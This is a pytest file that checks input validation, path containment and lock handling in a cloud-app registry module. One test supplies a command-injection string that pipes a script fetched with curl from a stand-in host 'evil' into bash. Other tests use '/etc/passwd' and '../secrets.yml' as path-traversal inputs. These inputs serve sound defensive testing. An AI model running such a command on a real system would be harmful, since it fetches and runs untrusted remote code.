
import pytest
from conftest import FakeResult, FakeRunner

from cloudapp import registry

# --- validate_names: the gate on caller-controlled identifiers ---

def test_validate_names_accepts_valid():
    registry.validate_names("dev", "orders", "acme/orders", "cloud-app.yml")


@pytest.mark.parametrize("env", ["../dev", "Dev", "", "a" * 41, "dev/prod", "de v", "-dev"])
def test_validate_names_rejects_bad_env(env):
    with pytest.raises(registry.RegistryError, match="environment name"):
        registry.validate_names(env, "orders", "acme/orders", "cloud-app.yml")


@pytest.mark.parametrize("name", ["../orders", "Orders", "", "a" * 41, "or ders"])
def test_validate_names_rejects_bad_stack_name(name):
    with pytest.raises(registry.RegistryError, match="stack name"):
        registry.validate_names("dev", name, "acme/orders", "cloud-app.yml")


@pytest.mark.parametrize("repo", ["acme", "acme/orders/extra", "acme/", "/orders", "acme orders", ""])
def test_validate_names_rejects_bad_caller_repo(repo):
    with pytest.raises(registry.RegistryError, match="caller repo"):
        registry.validate_names("dev", "orders", repo, "cloud-app.yml")


def test_validate_names_accepts_ordinary_stack_files():
    registry.validate_names("dev", "orders-api", "acme/orders", "cloud-app.yml")
    registry.validate_names("dev", "orders-api", "acme/orders", "subdir/app.yml")


def test_validate_names_rejects_shell_metacharacters_in_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names(
            "dev", "orders-api", "acme/orders", 'a";curl -s https://evil/x|bash;#.yml'
        )


def test_validate_names_rejects_absolute_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names("dev", "orders-api", "acme/orders", "/etc/passwd")


def test_validate_names_rejects_parent_traversal_in_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names("dev", "orders-api", "acme/orders", "../secrets.yml")


def test_validate_names_rejects_empty_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names("dev", "orders-api", "acme/orders", "")


def test_validate_names_rejects_trailing_newline_in_stack_file():
    with pytest.raises(registry.RegistryError, match="stack file"):
        registry.validate_names("dev", "orders-api", "acme/orders", "cloud-app.yml\n")


def test_validate_names_rejects_trailing_newline_in_stack_name():
    with pytest.raises(registry.RegistryError, match="stack name"):
        registry.validate_names("dev", "orders-api\n", "acme/orders", "cloud-app.yml")


# --- resolve_stack_path: path-traversal containment ---

def test_resolve_stack_path_returns_path_inside_root(tmp_path):
    root = tmp_path / "caller-workspace"
    root.mkdir()
    (root / "cloud-app.yml").write_text("name: orders\n")
    resolved = registry.resolve_stack_path(str(root), "cloud-app.yml")
    assert resolved == str((root / "cloud-app.yml").resolve())


def test_resolve_stack_path_rejects_parent_escape(tmp_path):
    root = tmp_path / "caller-workspace"
    root.mkdir()
    with pytest.raises(registry.RegistryError, match="escapes"):
        registry.resolve_stack_path(str(root), "../central-workspace/secret.yml")


def test_resolve_stack_path_rejects_absolute_path(tmp_path):
    root = tmp_path / "caller-workspace"
    root.mkdir()
    with pytest.raises(registry.RegistryError, match="escapes"):
        registry.resolve_stack_path(str(root), "/etc/passwd")


def test_resolve_stack_path_rejects_symlink_escape(tmp_path):
    root = tmp_path / "caller-workspace"
    root.mkdir()
    outside = tmp_path / "outside.yml"
    outside.write_text("name: evil\n")
    (root / "link.yml").symlink_to(outside)
    with pytest.raises(registry.RegistryError, match="escapes"):
        registry.resolve_stack_path(str(root), "link.yml")


# --- reconcile_stack_name: manifest name must match the dispatched name ---

def test_reconcile_stack_name_returns_declared_when_matching():
    assert registry.reconcile_stack_name("orders", "orders") == "orders"


def test_reconcile_stack_name_falls_back_to_expected_when_absent():
    assert registry.reconcile_stack_name(None, "orders") == "orders"


def test_reconcile_stack_name_raises_on_mismatch():
    with pytest.raises(registry.RegistryError, match="MISMATCH"):
        registry.reconcile_stack_name("payments", "orders")


# --- authorize_caller: trust-on-first-use ownership check ---

def test_authorize_caller_true_when_listed():
    assert registry.authorize_caller({"allowed_repos": ["acme/orders"]}, "acme/orders") is True


def test_authorize_caller_false_when_not_listed():
    assert registry.authorize_caller({"allowed_repos": ["acme/orders"]}, "evil/repo") is False


@pytest.mark.parametrize("lock", [{}, {"allowed_repos": None}, None])
def test_authorize_caller_false_when_no_allowlist(lock):
    assert registry.authorize_caller(lock, "acme/orders") is False


# --- new_lock: the registered payload ---

def test_new_lock_shape():
    assert registry.new_lock("orders", "dev", "acme/orders", "2026-07-24 00:00:00Z") == {
        "stack_name": "orders",
        "environment": "dev",
        "allowed_repos": ["acme/orders"],
        "registered_at": "2026-07-24 00:00:00Z",
    }


# --- persist_lock: git write-back, fail-closed ---

def test_persist_lock_runs_git_sequence_in_order():
    fake = FakeRunner()
    registry.persist_lock(fake, "central-workspace", "dev", "orders", "acme/orders")
    git_subcmds = [c[1] for c in fake.commands("git")]
    assert git_subcmds == ["config", "config", "add", "commit", "pull", "push"]
    assert fake.commands("git", "add") == [["git", "add", "registries/dev/orders.yml"]]


def test_persist_lock_fail_closed_when_push_rejected():
    fake = FakeRunner(results=[(["git", "push"], FakeResult(returncode=1, stderr="rejected"))])
    with pytest.raises(registry.RegistryError, match="not silently lost|persist"):
        registry.persist_lock(fake, "central-workspace", "dev", "orders", "acme/orders")
